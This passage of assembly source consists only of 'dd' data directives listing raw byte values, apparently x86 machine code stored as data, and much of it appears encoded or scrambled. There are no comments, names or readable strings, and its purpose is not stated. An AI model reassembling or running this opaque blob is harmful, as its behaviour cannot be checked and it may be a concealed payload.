		dd 7Eh,	7, 81h,	48h, 0D2h, 3 dup(40h), 0CDh, 56h, 1, 23h
		dd 90h,	0C9h, 18h, 6, 0C5h, 12h, 0F1h, 2 dup(3Fh), 73h
		dd 2Bh,	4Ch, 1,	20h, 52h, 96h, 41h, 1, 0F5h, 78h, 0Dh
		dd 8Ah,	0FCh, 74h, 46h,	5, 53h,	31h, 2 dup(7Fh), 0EAh
		dd 6Bh,	94h, 1,	73h, 4,	3 dup(80h), 0BEh, 47h, 0C6h, 90h
		dd 0E8h, 3 dup(80h), 0FEh, 70h,	7Fh, 21h, 0CDh,	53h, 0CBh
		dd 9Dh,	3Ch, 2Bh, 58h, 2Bh, 3Eh, 0C1h, 32h, 40h, 41h, 2	dup(40h)
		dd 71h,	18h, 0C5h, 1Eh,	0C1h, 23h, 0D7h, 3 dup(40h), 0CDh
		dd 0DAh, 0BDh, 3 dup(3Fh), 33h,	0F6h, 0EBh, 1Fh, 83h, 0C8h
		dd 63h,	85h, 0F0h, 74h,	18h, 8Dh, 1Bh, 0EBh, 14h, 0FFh
		dd 0E0h, 85h, 0C2h, 7Ch, 0Eh, 3Eh, 0C7h, 41h, 4, 45h, 3	dup(0)
		dd 8Dh,	0Bh, 7Eh, 2Eh, 61h, 33h, 86h, 2Bh, 5Fh,	0CDh, 9Bh
		dd 0Eh,	1, 29h,	0C2h, 7Eh, 7, 80h, 60h,	0C9h, 3	dup(40h)
		dd 0CDh, 91h, 8, 7Eh, 7, 82h, 60h, 91h,	3 dup(40h), 0CDh
		dd 30h,	0FFh, 3	dup(7Fh), 0Bh, 7Bh, 83h, 7Eh, 3, 47h, 82h
		dd 6Bh,	0AFh, 0Dh, 0CBh, 5Eh, 0F4h, 7Bh, 41h, 6Bh, 13h
		dd 0BEh, 47h, 0C0h, 88h, 0D1h, 3 dup(80h), 0Dh,	0C1h, 0CBh
		dd 0CDh, 52h, 2Bh, 58h,	0CDh, 80h, 0EDh, 7Eh, 7, 86h, 44h
		dd 97h,	3 dup(40h), 0CDh, 53h, 1, 21h, 59h, 0C3h, 3, 0B7h
		dd 0CDh, 0B3h, 0DAh, 0CDh, 76h,	0CBh, 13h, 43h,	0D6h, 4Ah
		dd 8Ah,	12h, 8Ah, 85h, 0D1h, 0B1h, 2 dup(0FFh),	3Ah, 0D0h
		dd 75h,	95h, 3Ah, 85h, 0D2h, 0B1h, 2 dup(0FFh),	74h, 8Dh
		dd 8Bh,	55h, 0FCh, 3, 0D6h, 8Ah, 12h, 3Ah, 95h,	0D2h, 0F1h
		dd 2 dup(3Fh), 4Fh, 0C5h, 0BAh,	3 dup(3Fh), 7Ah, 0C5h
		dd 13h,	0F1h, 2	dup(3Fh), 4Fh, 0C4h, 0AEh, 3 dup(3Fh)
		dd 0CBh, 85h, 3Ch, 43h,	6, 80h,	0CAh, 40h, 7Ah,	0C5h, 13h
		dd 31h,	2 dup(7Fh), 8Fh, 5, 0DAh, 3 dup(7Fh), 6Bh, 8Dh
		dd 0Dh,	96h, 41h, 6Bh, 92h, 0Dh, 0D6h, 57h, 41h, 62h, 19h
		dd 0Dh,	86h, 0Bh, 5Fh, 6Bh, 9Eh, 0F5h, 7Eh, 7Fh, 51h, 1
		dd 21h,	0D6h, 1, 2Eh, 0B4h, 2Bh, 52h, 0B5h, 3Eh, 0CDh
		dd 8Bh,	1Ah, 0C5h, 9, 0B4h, 49h, 0B4h, 35h, 1, 28h, 80h
		dd 0CDh, 58h, 0CDh, 4Ah, 0CBh, 0BDh, 3Ch, 2Bh, 71h, 0CDh
		dd 16h,	8Dh, 12h, 74h, 0FAh, 8Dh, 8, 0EBh, 27h,	8Dh, 16h
		dd 4Bh,	83h, 0EBh, 72h,	29h, 0D2h, 0EBh, 1Dh, 8Dh, 19h
		dd 49h,	40h, 35h, 99h, 3 dup(0)
		dd 81h,	0C9h, 95h, 0
		dd 2 dup(40h), 0CDh, 76h, 2Bh, 4Ah, 0CDh, 0B6h,	0EFh, 69h
		dd 1, 0CDh, 4Eh, 41h, 10h, 8Eh,	0CBh, 3, 2Bh, 4Bh, 0CDh
		dd 71h,	3Fh, 16h, 0CDh,	71h, 0CDh, 88h,	0ECh, 2	dup(8Ah)
		dd 0C9h, 5, 40h, 31h, 2	dup(7Fh), 6Bh, 94h, 3, 76h, 0A0h
		dd 0B9h, 5Bh, 0F5h, 8Dh, 3, 49h, 0A7h, 0BEh, 47h, 0C1h
		dd 0A0h, 87h, 3	dup(80h), 0Dh, 90h, 83h, 77h, 3, 46h, 82h
		dd 0C3h, 6, 54h, 2Bh, 52h, 71h,	18h, 79h, 1, 0B4h, 4Ch
		dd 0C1h, 32h, 0C0h, 3 dup(40h),	0C3h, 0Bh, 90h,	1, 2Bh
		dd 0A6h, 0CBh, 0C5h, 0
		dd 0F1h, 2 dup(3Fh), 0CBh, 78h,	0C5h, 0FFh, 7Ch, 72h, 47h
		dd 8Dh,	9Dh, 0DBh, 0B1h, 2 dup(0FFh), 0EBh, 2Ah, 8Dh, 91h
		dd 6Fh,	3 dup(0FFh), 8Dh, 1Ah, 8Dh, 18h, 0C1h, 0EBh, 38h
		dd 8Dh,	83h, 7Eh, 3 dup(0FFh), 0EBh, 55h, 7Eh, 0CAh, 5Ah
		dd 0C9h, 2, 7Eh, 0C8h, 58h, 2Bh, 4Bh, 3Fh, 21h,	98h, 0C3h
		dd 20h,	49h, 79h, 30h, 0BEh, 41h, 86h, 0CAh, 46h, 0C8h
		dd 43h,	2Bh, 4Dh, 0BEh,	3Eh, 90h, 3Fh, 53h, 3, 46h, 93h
		dd 0Dh,	81h, 41h, 62h, 18h, 0C6h, 6Bh, 93h, 0Dh, 88h, 0Dh
		dd 8Bh,	3, 63h,	89h, 5,	4Eh, 6Bh, 88h, 0C6h, 41h, 6Ah
		dd 0D7h, 0Dh, 82h, 5, 59h, 0C3h, 8Fh, 0B5h, 13h, 2Bh, 50h
		dd 0CDh, 80h, 20h, 0CDh, 0B0h, 0FCh, 0CDh, 73h,	0C5h, 2
		dd 0B4h, 44h, 0CDh, 48h, 69h, 2, 0CBh, 0C5h, 0
		dd 0F1h, 2 dup(3Fh), 0CBh, 80h,	44h, 0C9h, 0C5h, 0D4h
		dd 0B1h, 2 dup(0FFh), 0EBh, 6, 8Dh, 8, 0EBh, 0FCh, 9, 0F6h
		dd 8Bh,	85h, 0C0h, 0B1h, 2 dup(0FFh), 8Bh, 30h,	0EBh, 1Fh
		dd 1, 0D6h, 39h, 0CAh, 7Ch, 19h, 8Dh, 91h, 6Ah,	0FFh, 2	dup(3Fh)
		dd 79h,	1Ah, 2Bh, 4Fh, 0CDh, 9Eh, 0
		dd 7Eh,	7, 80h,	50h, 49h, 3 dup(40h), 61h, 6, 0CDh, 71h
		dd 0CBh, 3Eh, 0C5h, 3Fh, 4Fh, 0CCh, 0CBh, 3 dup(40h), 87h
		dd 0Dh,	1Dh, 5Bh, 31h, 2 dup(7Fh), 6Bh,	91h, 0B9h, 59h
		dd 0FCh, 8Dh, 5, 40h, 0FCh, 89h, 0D3h, 0D8h, 0Dh, 9Ah
		dd 0Dh,	0F3h, 19h, 0A1h, 71h, 0B3h, 40h, 0Ah, 83h, 0EBh
		dd 15h,	54h, 0F1h, 2 dup(3Fh), 8Dh, 4Fh, 0EFh, 16h, 6Bh
		dd 2, 0C8h, 0C5h, 1Ah, 0F1h, 2 dup(3Fh), 2Bh, 7Ch, 7Eh
		dd 7, 83h, 70h,	0A9h, 3	dup(40h), 2Bh, 36h, 0B4h, 34h
		dd 0C3h, 0
		dd 0B8h, 0C1h, 0E0h, 5,	9, 0D1h, 85h, 0F3h, 74h, 24h, 83h
		dd 0E3h, 10h, 8Dh, 53h,	0C0h, 0C1h, 0EBh, 69h, 0C1h, 0EEh
		dd 58h,	7Ch, 0DAh, 3Eh,	0C7h, 46h, 4, 71h, 3 dup(0)
		dd 0C1h, 23h, 0A5h, 0CDh, 53h, 7Eh, 7, 81h, 44h, 50h, 3	dup(40h)
		dd 80h,	0CAh, 0C5h, 1Ah, 0F1h, 2 dup(3Fh), 0C8h, 43h, 83h
		dd 8Fh,	0B5h, 0E0h, 2Bh, 4Fh, 1, 22h, 0C7h, 0C9h, 33h
		dd 0B1h, 4Eh, 3, 63h, 0D0h, 0Dh, 80h, 0Dh, 0C1h, 3Ah, 0Bh
		dd 0DDh, 88h, 6Bh, 85h,	0Dh, 0D0h, 6Fh,	0B9h, 59h, 0Dh
		dd 5, 5Bh, 31h,	2 dup(7Fh), 6Bh, 8Bh, 0Dh, 0B2h, 1, 71h
		dd 0C2h, 3 dup(40h), 96h, 0CDh,	4Bh, 93h, 3Fh, 10h, 0CDh
		dd 0C5h, 1Bh, 0F1h, 2 dup(3Fh),	2Bh, 48h, 0B4h,	3Eh, 3Fh
		dd 12h,	69h, 31h, 0B4h,	38h, 0CBh, 95h,	48h, 92h, 3Fh
		dd 10h,	0EBh, 0Dh, 8Dh,	89h, 77h, 4 dup(0FFh), 0E1h, 0C1h
		dd 0E8h, 65h, 7Ch, 0F3h, 5Fh, 5Eh, 5Bh,	8Bh, 0E5h, 5Dh
		dd 0C2h, 4, 0
		dd 90h,	2Bh, 33h, 6Ah, 83h, 0Bh, 2 dup(0)
		dd 67h,	3 dup(40h), 7Bh, 3 dup(40h), 0C3h, 4Bh,	6 dup(40h)
		dd 46h,	7Ch, 0DDh, 72h,	0B5h, 99h, 0E3h, 2 dup(0F0h), 44h
		dd 47h,	48h, 0DCh, 6, 7Eh, 23h,	0B2h, 22h, 0B3h, 3 dup(31h)
		dd 87h,	0BEh, 3Ch, 1Ch,	39h, 0A5h, 2Fh,	30h, 3,	5Ah, 22h
		dd 0A5h, 29h, 40h, 62h,	0BAh, 0F3h, 40h, 62h, 5Ah, 1, 0A8h
		dd 2Bh,	95h, 0BCh, 4Eh,	21h, 3 dup(0F1h), 7Ch, 4Ch, 0FDh
		dd 7Ch,	4Ch, 0FDh, 7Ch,	0Ch, 7Ch, 0Ch, 7Ch, 4Ch, 9, 7Ah
		dd 4Eh,	0EDh, 24h, 0B1h, 7Ah, 36h, 0CDh, 0B7h, 36h, 9Eh
		dd 38h,	0B7h, 36h, 9Fh,	1, 77h,	0F6h, 60h, 0F2h, 3Ch, 0F6h
		dd 0ADh, 3Ah, 36h, 65h,	0AEh, 2	dup(0B0h), 3Ch,	0Eh, 0ADh
		dd 9Ch,	0C6h, 26h, 0AFh, 3Eh, 0CFh, 2Fh, 0ABh, 32h, 9Fh
		dd 47h,	3 dup(0B1h), 0B0h, 0D3h, 6Dh, 0E1h, 7Eh, 0Ah, 7Eh
		dd 3Fh,	0ADh, 7Ch, 36h,	0EDh, 7Ch, 31h,	2Dh, 0F4h, 36h
		dd 0EDh, 7Ch, 41h, 69h,	7Ah, 46h, 89h, 7Ch, 41h, 6Dh, 7Ah
		dd 46h,	8Dh, 7Ch, 36h, 0EDh, 34h, 76h, 0C9h, 0BCh, 81h
		dd 49h,	7Bh, 0B6h, 3, 40h, 0B3h, 0DFh, 3 dup(31h), 73h
		dd 0BAh, 0C6h, 0E1h, 2Eh, 2 dup(30h), 64h, 3, 0BCh, 0A1h
		dd 51h,	34h, 0A6h, 2Dh,	0BCh, 0FBh, 0B2h, 0D2h,	0F3h, 0F4h
		dd 0E2h, 7Ch, 3Fh, 0FDh, 0F4h, 3Eh, 0EDh, 7Bh, 0FAh, 2Bh
		dd 3Eh,	9Eh, 66h, 6Fh, 7Ch, 3Fh, 0FDh, 0F4h, 3Eh, 0EDh
		dd 7Bh,	3Ah, 0F4h, 2Bh,	3Eh, 9Fh, 66h, 61h, 3Ch, 0FFh
		dd 0BDh, 0B4h, 0FEh, 0ADh, 3Bh,	0FAh, 0B8h, 0EBh, 0FEh
		dd 60h,	26h, 13h, 3Ch, 0F9h, 0D5h, 0B4h, 3Eh, 65h, 0AEh
		dd 2 dup(0B0h),	3Ch, 0A3h, 0B4h, 0A7h, 0B4h, 7Fh, 17h
		dd 3Ch,	0E2h, 57h, 74h,	0B7h, 0F4h, 0DCh, 6, 66h, 0EFh
		dd 7Eh,	0Fh, 6Fh, 0EBh,	72h, 0DFh, 87h,	3 dup(0F1h), 0F0h
		dd 0D3h, 6Dh, 0E1h, 7Eh, 0Ah, 7Eh, 3Fh,	0ADh, 7Ch, 39h
		dd 0Dh,	0F4h, 7Eh, 0E5h, 2Eh, 2	dup(30h), 40h, 0E8h, 27h
		dd 0F2h, 17h, 33h, 34h,	0FFh, 0BCh, 22h, 1Ch, 46h, 0A6h
		dd 2Fh,	0BEh, 4Fh, 0AFh, 2Bh, 0B2h, 1Fh, 0C7h, 3 dup(31h)
		dd 30h,	13h, 0ADh, 21h,	7Eh, 0Ah, 7Eh, 3Fh, 0ADh, 7Ch
		dd 0FFh, 0F4h, 7Eh, 0A5h, 0EEh,	2 dup(0F0h), 7Ah, 3Eh
		dd 0CDh, 33h, 0F0h, 7Eh, 0A1h, 0EEh, 2 dup(0F0h), 0
		dd 76h,	4Ch, 3 dup(0F0h), 0B7h,	76h, 0E6h, 0ADh, 2 dup(0B0h)
		dd 0FDh, 77h, 36h, 0A7h, 0ADh, 2 dup(0B0h), 20h, 77h, 36h
		dd 0A8h, 0ADh, 2 dup(0B0h), 12h, 77h, 36h, 0A9h, 0ADh
		dd 2 dup(0B0h),	15h, 77h, 36h, 0AAh, 0ADh, 2 dup(0B0h)
		dd 0FDh, 0B7h, 76h, 0EBh, 0EDh,	2 dup(0F0h), 5Ah, 0B7h
		dd 76h,	0ECh, 0EDh, 2 dup(0F0h), 53h, 0B7h, 76h, 2 dup(0EDh)
		dd 2 dup(0F0h),	63h, 0B7h, 76h,	0EEh, 0EDh, 2 dup(0F0h)
		dd 52h,	0B7h, 76h, 0EFh, 0EDh, 2 dup(30h), 0A3h, 0F7h
		dd 0B6h, 30h, 2Dh, 2 dup(30h), 0AAh, 0F7h, 0B6h, 31h, 2Eh
		dd 2 dup(30h), 72h, 0F7h, 0B6h,	32h, 2Eh, 2 dup(30h), 31h
		dd 0BEh, 0B6h, 26h, 2Dh, 2 dup(30h), 81h, 84h, 0F0h, 46h
		dd 0CDh, 7Ah, 2	dup(0B7h), 76h,	0Eh, 0E5h, 2 dup(0F0h)
		dd 66h,	0B7h, 76h, 0Fh,	0E5h, 2	dup(0F0h), 64h,	0B7h, 76h
		dd 10h,	0E5h, 2	dup(0F0h), 56h,	0B7h, 76h, 11h,	0E5h, 2	dup(0F0h)
		dd 23h,	77h, 36h, 0D2h,	0A5h, 2	dup(0B0h), 0E4h, 77h, 36h
		dd 0D3h, 0A5h, 2 dup(0B0h), 0E3h, 77h, 36h, 0D4h, 0A5h
		dd 2 dup(0B0h),	0DFh, 77h, 36h,	0D5h, 0A5h, 2 dup(0B0h)
		dd 15h,	77h, 36h, 0D6h,	0E5h, 2	dup(0F0h), 5Dh,	0B7h, 76h
		dd 17h,	0E5h, 2	dup(0F0h), 5Dh,	0B7h, 76h, 18h,	0E5h, 2	dup(0F0h)
		dd 0F1h, 7Eh, 76h, 0Eh,	0E5h, 2	dup(0F0h), 41h,	0F0h, 0C7h
		dd 7Ah,	76h, 61h, 0EFh,	0F0h, 30h, 0F7h, 0B6h, 6Ch, 2Fh
		dd 2 dup(30h), 7Ah, 0F7h, 0B6h,	6Dh, 2Fh, 2 dup(30h), 0A4h
		dd 0F7h, 0B6h, 6Eh, 2Fh, 2 dup(30h), 88h, 0F7h,	0B6h, 6Fh
		dd 2Fh,	2 dup(30h), 9Ah, 0F7h, 0B6h, 70h, 0EFh,	2 dup(0F0h)
		dd 5Fh,	0B7h, 76h, 31h,	0EFh, 2	dup(0F0h), 55h,	0B7h, 76h
		dd 32h,	0EFh, 2	dup(0F0h), 60h,	0B7h, 76h, 33h,	0EFh, 2	dup(0F0h)
		dd 68h,	0B7h, 76h, 34h,	0EFh, 2	dup(0F0h), 0F1h, 3Eh, 36h
		dd 0ECh, 0AFh, 2 dup(0B0h), 1, 3Ch, 36h, 21h, 0AFh, 2 dup(0B0h)
		dd 1, 0B0h, 6, 8Dh, 3Ah, 0F6h, 0A9h, 1Bh, 0B1h,	0B0h, 6
		dd 0A9h, 0C0h, 67h, 0F5h, 0D5h,	0A4h, 0EDh, 0B0h, 65h
		dd 7, 7Eh, 0FAh, 2Fh, 0B8h, 34h, 31h, 89h, 3 dup(0F1h)
		dd 7Eh,	0F3h, 0F0h, 46h, 0E5h, 2Ah, 0B4h, 6Fh, 0F4h, 7Eh
		dd 4Ch,	8Ch, 0B7h, 76h,	48h, 0EEh, 2 dup(0F0h),	3Dh, 0B7h
		dd 0B6h, 89h, 2Eh, 2 dup(30h), 0A0h, 0F7h, 0B6h, 8Ah, 2Eh
		dd 2 dup(30h), 94h, 0F7h, 0B6h,	8Bh, 2Eh, 2 dup(30h), 9Ch
		dd 0F7h, 0B6h, 8Ch, 2Eh, 2 dup(30h), 83h, 0F7h,	0B6h, 8Dh
		dd 2Eh,	30h, 0F0h, 56h,	0B7h, 76h, 4Eh,	0EEh, 2	dup(0F0h)
		dd 64h,	0B7h, 76h, 4Fh,	0EEh, 2	dup(0F0h), 60h,	0B7h, 76h
		dd 50h,	0EEh, 2	dup(0F0h), 66h,	0B7h, 76h, 51h,	0EEh, 2	dup(0F0h)
		dd 63h,	0B7h, 76h, 12h,	0AEh, 2	dup(0B0h), 14h,	77h, 36h
		dd 13h,	0AEh, 2	dup(0B0h), 16h,	77h, 36h, 14h, 0AEh, 2 dup(0B0h)
		dd 0B1h, 3Eh, 36h, 8, 0AEh, 2 dup(0B0h), 1, 4, 0B0h, 6
		dd 8Dh,	3Ah, 0F6h, 0C1h, 0B7h, 76h, 62h, 0EEh, 2 dup(0F0h)
		dd 44h,	0B7h, 76h, 63h,	0EEh, 2	dup(0F0h), 5Ah,	0B7h, 76h
		dd 64h,	0EEh, 2	dup(0F0h), 6Bh,	0B7h, 76h, 65h,	0EEh, 2	dup(0F0h)
		dd 56h,	0B7h, 76h, 66h,	2Eh, 2 dup(30h), 0A0h, 0F7h, 0B6h
		dd 0A7h, 2Eh, 2	dup(30h), 97h, 0F7h, 0B6h, 0A8h, 2Eh, 2	dup(30h)
		dd 83h,	0F7h, 0B6h, 0A9h, 2Eh, 2 dup(30h), 96h,	0F7h, 0B6h
		dd 0AAh, 2Eh, 2	dup(30h), 0A4h,	0B7h, 76h, 6Bh,	0EEh, 2	dup(0F0h)
		dd 60h,	0B7h, 76h, 6Ch,	0EEh, 2	dup(0F0h), 66h,	0B7h, 76h
		dd 6Dh,	0EEh, 2	dup(0F0h), 63h,	0B7h, 76h, 6Eh,	0EEh, 2	dup(0F0h)
		dd 54h,	0B7h, 76h, 6Fh,	0EEh, 2	dup(0B0h), 16h,	77h, 36h
		dd 30h,	0AEh, 2	dup(0B0h), 0B1h, 3Eh, 36h, 22h,	0AEh, 2	dup(0B0h)
		dd 1, 4, 0B0h, 6, 8Dh, 3Ah, 0F6h, 89h, 77h, 36h, 15h, 0AEh
		dd 2 dup(0B0h),	0FDh, 77h, 76h,	56h, 0EEh, 2 dup(0F0h)
		dd 60h,	0B7h, 76h, 57h,	0EEh, 2	dup(0F0h), 52h,	0B7h, 76h
		dd 58h,	0EEh, 2	dup(0F0h), 55h,	0B7h, 76h, 59h,	0EEh, 2	dup(0F0h)
		dd 43h,	0B7h, 76h, 5Ah,	0EEh, 0F0h, 30h, 96h, 0F7h, 0B6h
		dd 9Bh
		dd 2Eh,	2 dup(30h), 0A4h, 0F7h,	0B6h, 9Ch, 2Eh,	2 dup(30h)
		dd 0A0h, 0F7h, 0B6h, 9Dh, 2Eh, 2 dup(30h), 0A6h, 0F7h
		dd 0B6h, 9Eh, 2Eh, 2 dup(30h), 0A3h, 0F7h, 0B6h, 5Fh, 0EEh
		dd 2 dup(0F0h),	54h, 0B7h, 76h,	60h, 0EEh, 2 dup(0F0h)
		dd 56h,	0B7h, 76h, 61h,	0EEh, 2	dup(0F0h), 0F1h, 7Eh, 76h
		dd 55h,	0EEh, 2	dup(0F0h), 41h,	44h, 0F0h, 46h,	0CDh, 7Ah
		dd 36h,	85h, 77h, 36h, 3Fh, 0AEh, 2 dup(0B0h), 0F8h, 77h
		dd 36h,	40h, 0AEh, 2 dup(0B0h),	16h, 77h, 36h, 41h, 0AEh
		dd 2 dup(0B0h),	25h, 77h, 36h, 42h, 0AEh, 2 dup(0B0h)
		dd 0FEh, 77h, 36h, 43h,	0EEh, 2	dup(0F0h), 60h,	0B7h, 76h
		dd 84h,	0EEh, 2	dup(0F0h), 55h,	0B7h, 76h, 85h,	0EEh, 2	dup(0F0h)
		dd 66h,	0B7h, 76h, 86h,	0EEh, 2	dup(0F0h), 5Dh,	0B7h, 76h
		dd 87h,	0EEh, 2	dup(0F0h), 56h,	0F7h, 0B6h, 0C8h, 2Eh
		dd 2 dup(30h), 79h, 0F7h, 0B6h,	0C9h, 2Eh, 2 dup(30h)
		dd 92h,	0F7h, 0B6h, 0CAh, 2Eh, 2 dup(30h), 9Fh,	0F7h, 0B6h
		dd 0CBh, 2Eh, 2	dup(30h), 95h, 0F7h, 0B6h, 0CCh, 2Eh, 2	dup(0F0h)
		dd 5Dh,	0B7h, 76h, 8Dh,	0EEh, 2	dup(0F0h), 56h,	0B7h, 76h
		dd 8Eh,	0EEh, 2	dup(0F0h), 32h,	0B7h, 76h, 8Fh,	0EEh, 2	dup(0F0h)
		dd 0F1h, 7Eh, 76h, 7Fh,	0EEh, 2	dup(0F0h), 41h,	44h, 0B0h
		dd 6, 8Dh, 3Ah,	2 dup(77h), 36h, 31h, 0AEh, 2 dup(0B0h)
		dd 0F7h, 77h, 36h, 32h,	0AEh, 2	dup(0B0h), 1Ah,	77h, 36h
		dd 33h,	0AEh, 2	dup(0B0h), 1Fh,	77h, 36h, 34h, 0AEh, 2 dup(0B0h)
		dd 55h,	0B7h, 76h, 75h,	0EEh, 2	dup(0F0h), 43h,	0B7h, 2	dup(76h)
		dd 0EEh, 2 dup(0F0h), 56h, 0B7h, 76h, 77h, 0EEh, 2 dup(0F0h)
		dd 64h,	0B7h, 76h, 78h,	0EEh, 2	dup(0F0h), 60h,	0B7h, 76h
		dd 79h,	2Eh, 2 dup(30h), 0A6h, 0F7h, 0B6h, 0BAh, 2Eh, 2	dup(30h)
		dd 0A3h, 0F7h, 0B6h, 0BBh, 2Eh,	2 dup(30h), 94h, 0F7h
		dd 0B6h, 0BCh, 2Eh, 2 dup(30h),	96h, 0F7h, 0B6h, 0BDh
		dd 2Eh,	2 dup(30h), 72h, 0B7h, 76h, 7Eh, 0EEh, 2 dup(0F0h)
		dd 0F1h, 7Eh, 76h, 71h,	0EEh, 2	dup(0F0h), 41h,	44h, 0F0h
		dd 46h,	0CDh, 7Ah, 0B8h, 0B7h, 76h, 1Ah, 0EEh, 2 dup(0F0h)
		dd 47h,	0B7h, 76h, 1Bh,	0EEh, 0F0h, 0B0h, 1Ah, 77h, 36h
		dd 0DCh, 0AEh, 2 dup(0B0h), 23h, 77h, 36h, 0DDh, 0AEh
		dd 2 dup(0B0h),	25h, 77h, 36h, 0DEh, 0AEh, 2 dup(0B0h)
		dd 26h,	77h, 36h, 0DFh,	0AEh, 2	dup(0B0h), 12h,	77h, 36h
		dd 20h,	0EEh, 2	dup(0F0h), 5Dh,	0B7h, 76h, 21h,	0EEh, 2	dup(0F0h)
		dd 32h,	0B7h, 76h, 22h,	0EEh, 2	dup(0F0h), 5Dh,	0B7h, 76h
		dd 23h,	0EEh, 2	dup(0F0h), 5Dh,	0B7h, 76h, 24h,	0EEh, 2	dup(0F0h)
		dd 0A0h, 0F7h, 0B6h, 65h, 2Eh, 2 dup(30h), 94h,	0F7h, 0B6h
		dd 66h,	2Eh, 2 dup(30h), 31h, 0BEh, 0B6h, 5Ah, 2Eh, 2 dup(30h)
		dd 81h,	84h, 30h, 86h, 0Dh, 0BAh, 76h, 0FDh, 0F7h, 0B6h
		dd 0DCh, 0E3h, 2 dup(0F0h), 47h, 0B7h, 76h, 9Dh, 0E3h
		dd 2 dup(0F0h),	5Ah, 0B7h, 76h,	9Eh, 0E3h, 2 dup(0F0h)
		dd 63h,	0B7h, 76h, 9Fh,	0E3h, 2	dup(0F0h), 65h,	0B7h, 76h
		dd 0A0h, 0E3h, 2 dup(0F0h), 66h, 77h, 36h, 61h,	0A3h, 2	dup(0B0h)
		dd 12h,	77h, 36h, 62h, 0A3h, 2 dup(0B0h), 1Dh, 77h, 36h
		dd 63h,	0A3h, 2	dup(0B0h), 0F7h, 77h, 36h, 64h,	0A3h, 2	dup(0B0h)
		dd 23h,	77h, 36h, 65h, 0A3h, 2 dup(0F0h), 56h, 0B7h, 76h
		dd 0A6h, 0E3h, 2 dup(0F0h), 56h, 0B7h, 76h, 0A7h, 0E3h
		dd 2 dup(0F0h),	0F1h, 7Eh, 76h,	9Ch, 0E3h, 2 dup(0F0h)
		dd 41h,	44h, 0F0h, 46h,	0CDh, 7Ah, 76h,	0ADh, 0EEh, 2 dup(30h)
		dd 9Bh,	31h, 30h, 7, 0BAh, 0B6h, 0A5h, 2Fh, 2 dup(30h)
		dd 0EFh, 33h, 3	dup(31h), 9Bh, 48h, 87h, 0BCh, 0B6h, 0A5h
		dd 2Fh,	2 dup(30h), 81h, 30h, 8, 0BCh, 9, 84h, 7Ch, 76h
		dd 65h,	0EFh, 2	dup(0F0h), 41h,	0F0h, 46h, 0C9h, 7Ah, 36h
		dd 99h,	44h, 7Ch, 76h, 65h, 0EFh, 2 dup(0F0h), 41h, 0F0h
		dd 46h,	0C5h, 7Ch, 0C9h, 44h, 0F0h, 46h, 0C1h, 7Ah, 36h
		dd 0A1h, 0F7h, 34h, 2Eh, 59h, 15h, 27h,	7Ah, 1Bh, 0F1h
		dd 19h,	0B1h, 0C1h, 2 dup(0B1h), 3Ch, 0F6h, 59h
		dd 1, 1Bh, 0B1h, 0B0h, 6, 7Dh, 3Ah, 0F6h, 9Dh, 3Ch, 0F6h
		dd 0A1h, 3Ah, 0F6h, 0DDh, 0D9h,	4 dup(0F1h), 49h, 7Ah
		dd 36h,	0D9h, 0B7h, 76h, 70h, 3	dup(0F0h), 33h,	0B7h, 36h
		dd 71h,	12h, 0B7h, 36h,	72h, 2 dup(24h), 0B1h, 31h, 7Ch
		dd 46h,	0D9h, 0F4h, 1, 7Bh, 0BBh, 43h, 6Bh, 0C6h, 0B0h
		dd 3 dup(30h), 0A6h, 20h, 0BCh,	86h, 19h, 34h, 1, 0BBh
		dd 43h,	6Bh, 86h, 0B1h,	0A6h, 14h, 0BCh, 86h, 19h, 34h
		dd 1, 73h, 0BBh, 43h, 2Bh, 46h,	72h, 66h, 0C7h,	0F4h, 36h
		dd 0D9h, 74h, 0B1h, 0F3h, 7Ah, 76h, 65h, 3 dup(0F0h), 5Bh
		dd 31h,	59h, 0F1h, 1, 2	dup(0F1h), 7Ch,	36h, 99h, 41h
		dd 5Bh,	0F1h, 0F0h, 46h, 7Dh, 3Ah, 0F6h, 91h, 3Ch, 36h
		dd 25h,	3 dup(0B0h), 3Ch, 0F1h,	0C9h, 3Ah, 0F6h, 95h, 3Ch
		dd 0F6h, 0A1h, 0B4h, 0F6h, 95h,	3Ah, 0F6h, 91h,	19h, 0B1h
		dd 31h,	2 dup(0B1h), 3Ch, 0F6h,	99h, 41h, 7Ch, 36h, 0DDh
		dd 41h,	0F0h, 86h, 0ADh, 0EEh, 2 dup(0F0h), 5Bh, 31h, 59h
		dd 0F1h, 1, 2 dup(0F1h), 7Ch, 36h, 99h,	41h, 5Bh, 0F1h
		dd 0F0h, 46h, 0BDh, 7Ah, 36h, 0DDh, 24h, 3, 0BCh, 76h
		dd 0D9h, 0B6h, 0F1h, 0ADh, 59h,	71h, 0BAh, 0B6h, 0E1h
		dd 2Eh,	2 dup(30h), 64h, 0F1h, 0BCh, 7Eh, 11h, 0B1h, 6Dh
		dd 32h,	31h, 0A5h, 3Eh,	0BCh, 7Eh, 1Dh,	0BCh, 8Eh, 11h
		dd 7Bh,	0Dh, 0F4h, 79h,	0Dh, 2,	33h, 31h, 0F0h,	7Eh, 0A1h
		dd 0EEh, 2 dup(0F0h), 66h, 0D2h, 5Bh, 31h, 59h,	0F1h, 1
		dd 2 dup(0F1h),	7Ch, 36h, 99h, 41h, 5Bh, 0F1h, 0F0h, 46h
		dd 0BDh, 3Ch, 0Eh, 9Dh,	19h, 0B1h, 31h,	2 dup(0B1h), 3Ch
		dd 0F6h, 59h, 1, 3Ch, 0F6h, 91h, 1, 0B0h, 46h, 6Dh, 0AEh
		dd 2 dup(0B0h),	77h, 36h, 74h, 0A4h, 2 dup(0B0h), 0A0h
		dd 77h,	36h, 75h, 0E4h,	2 dup(0F0h), 0EBh, 0B7h, 76h, 0B6h
		dd 0E4h, 2 dup(0F0h), 0A9h, 0B7h, 76h, 0B7h, 0E4h, 2 dup(0F0h)
		dd 3Ah,	0B7h, 76h, 0B8h, 0E4h, 2 dup(0F0h), 3Fh, 0B7h
		dd 76h,	0B9h, 0E4h, 2 dup(0F0h), 68h, 0F7h, 0B6h, 0FAh
		dd 24h,	2 dup(30h), 0F8h, 0F7h,	0B6h, 0FBh, 24h, 2 dup(30h)
		dd 80h,	0F7h, 0B6h, 0FCh, 24h, 2 dup(30h), 14h,	0F7h, 0B6h
		dd 0FDh, 24h, 2	dup(30h), 1Dh, 0F7h, 0B6h, 0FEh, 24h, 2	dup(0F0h)
		dd 39h,	0B7h, 76h, 0BFh, 0E4h, 2 dup(0F0h), 36h, 0B7h
		dd 76h,	0C0h, 0E4h, 2 dup(0F0h), 0D5h, 0B7h, 76h, 0C1h
		dd 0E4h, 2 dup(0F0h), 45h, 0B7h, 76h, 0C2h, 0E4h, 2 dup(0F0h)
